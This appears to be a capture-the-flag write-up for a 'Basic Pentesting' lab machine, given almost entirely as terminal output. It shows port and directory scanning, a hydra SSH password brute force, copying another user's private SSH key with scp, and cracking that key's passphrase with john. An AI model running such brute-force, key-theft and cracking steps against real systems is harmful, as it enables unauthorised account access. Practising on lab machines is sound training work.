# Basic Pentesting
This is a machine that allows you to practise web app hacking and privilege escalation

```
┌──(yuu㉿kali)-[/mnt/shared/repos/TryHackMe-env/Day2]
└─$ sudo nmap -sV -Pn -oN nmap.txt -v 10.10.78.106
[sudo] password for yuu:
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-03 19:30 JST
NSE: Loaded 46 scripts for scanning.
Initiating Parallel DNS resolution of 1 host. at 19:30
Completed Parallel DNS resolution of 1 host. at 19:30, 0.09s elapsed
Initiating SYN Stealth Scan at 19:30
Scanning 10.10.78.106 [1000 ports]
Discovered open port 22/tcp on 10.10.78.106
Discovered open port 8080/tcp on 10.10.78.106
Discovered open port 80/tcp on 10.10.78.106
Discovered open port 139/tcp on 10.10.78.106
Discovered open port 445/tcp on 10.10.78.106
Discovered open port 8009/tcp on 10.10.78.106
Completed SYN Stealth Scan at 19:31, 5.73s elapsed (1000 total ports)
Initiating Service scan at 19:31
Scanning 6 services on 10.10.78.106
Service scan Timing: About 83.33% done; ETC: 19:34 (0:00:36 remaining)
Completed Service scan at 19:34, 182.75s elapsed (6 services on 1 host)
NSE: Script scanning 10.10.78.106.
Initiating NSE at 19:34
Completed NSE at 19:34, 16.17s elapsed
Initiating NSE at 19:34
Completed NSE at 19:34, 2.29s elapsed
Nmap scan report for 10.10.78.106
Host is up (0.75s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
8009/tcp open  ajp13?
8080/tcp open  http-proxy
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 207.32 seconds
           Raw packets sent: 1096 (48.224KB) | Rcvd: 1096 (43.864KB)
```

```
┌──(yuu㉿kali)-[/mnt/shared/repos/TryHackMe-env/Day2]
└─$ dirb http://10.10.78.106 /usr/share/dirb/wordlists/small.txt

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Sun Nov  3 19:49:46 2024
URL_BASE: http://10.10.78.106/
WORDLIST_FILES: /usr/share/dirb/wordlists/small.txt

-----------------

GENERATED WORDS: 959

---- Scanning URL: http://10.10.78.106/ ----
==> DIRECTORY: http://10.10.78.106/development/

---- Entering directory: http://10.10.78.106/development/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

-----------------
END_TIME: Sun Nov  3 19:57:30 2024
DOWNLOADED: 959 - FOUND: 0
```


```
┌──(yuu㉿kali)-[~/TryHackMe/Day2]
└─$ hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.78.106 -t 4
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-03 21:27:54
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://10.10.78.106:22/
[STATUS] 65.00 tries/min, 65 tries in 00:01h, 14344334 to do in 3678:03h, 4 active
[STATUS] 64.33 tries/min, 193 tries in 00:03h, 14344206 to do in 3716:07h, 4 active
[STATUS] 66.29 tries/min, 464 tries in 00:07h, 14343935 to do in 3606:36h, 4 active
[22][ssh] host: 10.10.78.106   login: jan   password: armando
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-03 21:39:35
```


```
┌──(yuu㉿kali)-[~/TryHackMe/Day2]
└─$ scp jan@10.10.78.106:/home/kay/.ssh/id_rsa ~/TryHackMe/Day2
jan@10.10.78.106's password:
id_rsa                                                                                                      100% 3326     3.2KB/s   00:01
```

```
┌──(yuu㉿kali)-[~/TryHackMe/Day2]
└─$ ssh2john kay_id_rsa > kay_id_rsa.hash

┌──(yuu㉿kali)-[~/TryHackMe/Day2]
└─$ cat kay_id_rsa.hash
kay_id_rsa:$sshng$1$16$6ABA7DE35CD ...

┌──(yuu㉿kali)-[~/TryHackMe/Day2]
└─$ john kay_id_rsa.hash
Created directory: /home/yuu/.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
Proceeding with incremental:ASCII
beeswax          (kay_id_rsa)
1g 0:00:05:48 DONE 3/3 (2024-11-03 22:53) 0.002868g/s 5567Kp/s 5567Kc/s 5567KC/s beelkul..beeswin
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
